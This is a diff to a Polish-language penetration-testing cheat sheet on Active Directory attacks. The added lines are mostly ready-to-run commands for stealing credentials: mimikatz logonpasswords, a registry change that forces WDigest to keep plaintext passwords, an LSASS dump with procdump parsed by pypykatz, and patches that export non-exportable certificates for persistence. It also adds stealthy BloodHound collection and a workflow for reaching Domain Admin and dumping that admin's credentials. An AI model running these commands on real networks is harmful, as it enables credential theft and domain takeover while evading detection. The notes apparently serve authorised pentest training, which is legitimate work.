@@ -1435,7 +1435,32 @@ lsadump::sam
 privilege::debug
 token::elevate
 sekurlsa::msv
+sekurlsa::logonpasswords            :: sprawdź blok 'wdigest:' — Password inny niż (null) = PLAINTEXT za darmo (Win7/2008R2/WDigest on)
 ```
+> Wymuszenie WDigest (potem czekaj na logowanie/RDP): `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`.
+
+### Offline LSASS — zrzuć teraz, wyciągnij później (mniej podejrzane niż mimikatz live)
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp     :: albo Task Manager → lsass.exe → Create dump file
+```
+```bash
+pypykatz lsa minidump lsass.dmp                       # parsowanie na Kali (bez mimikatza)
+```
+```
+:: albo w mimikatz (na maszynie pomocniczej): sekurlsa::minidump ŁADUJ PRZED logonpasswords!
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+> ⚠️ Bitowość dumpu i parsera musi się zgadzać. Analogia offline dla NTDS.dit → §5.6.
+
+### Kradzież certyfikatów (klucze non-exportable — AD CS / smart-card)
+```
+crypto::capi                        :: patch CryptoAPI (klucze user-store)
+crypto::cng                         :: patch KeyIso/CNG (klucze machine-store)
+crypto::certificates /systemstore:local_machine /store:my /export   :: eksport cert+klucz do .pfx (hasło: mimikatz)
+```
+> `capi`/`cng` PRZED `certificates /export` — patch pozwala wyeksportować inaczej „non-exportable" klucz. Skradziony cert client-auth → logowanie PKINIT jako ofiara (persistencja).
+
 ### Klucze Kerberos (do Pass-the-Key)
 ```
 privilege::debug
@@ -1624,7 +1649,11 @@ mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-19873
 ```powershell
 Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "corp_audit"
+Invoke-BloodHound -CollectionMethod All -Stealth                       # mniej dotknięć LDAP/hostów (ciszej)
+Invoke-BloodHound -CollectionMethod All -Loop -LoopDuration 00:30:00 -LoopInterval 00:05:00   # łap sesje pojawiające się PÓŹNIEJ
+Invoke-BloodHound -CollectionMethod All -ZipPassword P@ss123           # zaszyfruj wynikowy .zip
 ```
+> Kolekcja to migawka z Twojej perspektywy — user logujący się po pierwszym zrzucie zostanie pominięty → `-Loop`. Usuń plik cache `.bin` po zbiórce (niepotrzebny do analizy).
 **bloodhound-python** — kolektor z Linuxa (potrzeba poświadczeń):
 ```bash
 bloodhound-python -u asrepuser1 -p 'qwerty123!' -d $DOMAIN -ns $DC -c All --zip
@@ -1643,6 +1672,8 @@ bloodhound                          # aplikacja GUI
 - *Execution privileges* — RDP/PSRemote
 - *Outbound/Inbound object control* — prawa nad innymi obiektami i odwrotnie
 - **Prebuilt queries** → "Shortest Path to Domain Admins" = złota ścieżka
+
+> 🎯 **Workflow „owned" (praktyczna pętla foothold → DA):** prawy-klik na każdym koncie/hoście, który kontrolujesz → **Mark as Owned** (czaszka) → `Analysis > Shortest Paths to Domain Admins from Owned Principals` (zwraca **NO DATA**, dopóki czegoś nie oznaczysz!). Prawy-klik na **krawędzi** między węzłami → **? Help > Abuse** = gotowe komendy exploitacji + **Opsec**. Krawędzie: `AdminTo` (local admin), `HasSession` (creds w pamięci → ukradnij), ACL (`GenericAll`/`WriteDacl`/`ForceChangePassword` → §6.5). **Klasyk:** DA ma `HasSession` na hoście, gdzie masz `AdminTo` → zaloguj się i zrzuć jego creds z LSASS.
 
 ## 6.2 Enumeracja z hosta domenowego (manual → PowerView → moduł AD)
 
@@ -1718,11 +1749,12 @@ Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-
 
 **Kto jest zalogowany (logged-on users → namierzanie adminów):**
 ```powershell
-Get-NetSession -ComputerName files04 -Verbose      # na serwerach często "Access is denied" (od 2016 wymaga uprawnień)
+Get-NetSession -ComputerName files04 -Verbose      # -Verbose ujawnia prawdziwe "Access is denied" vs pusty wynik (brak sesji)
 Get-NetSession -ComputerName client74              # workstacje userów zwykle ODPOWIADAJĄ → tu szukaj sesji
-.\PsLoggedon.exe \\files04                          # Sysinternals — alternatywa, gdy Get-NetSession blokuje
+Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl   # klucz SrvsvcSessionInfo — brak 'Authenticated Users' = zdalny enum zablokowany
+.\PsLoggedon.exe \\files04                          # Sysinternals — alternatywa (wymaga usługi Remote Registry na celu)
 ```
-> Praktyka z modułu: `Get-NetSession` na kontrolerach/serwerach zwykle zwraca *Access denied*, ale na **stacjach roboczych** działa — tam łapiesz, gdzie loguje się admin (cel PtH/lateral). `PsLoggedon` to backup, gdy sesje są zablokowane.
+> Przyczyna: od ~Win10 build 1709 / Server 2019 usunięto „Authenticated Users" z ACL klucza **SrvsvcSessionInfo** → zwykły user nie odczyta sesji zdalnie. Enumeruj `operatingsystemversion` (Get-NetComputer) → **starsze hosty** wciąż pozwalają. `PsLoggedon` zależy od Remote Registry (default off na stacjach, często on na serwerach).
 
 ### D. Moduł ActiveDirectory (natywny, „czysty”)
 ```powershell
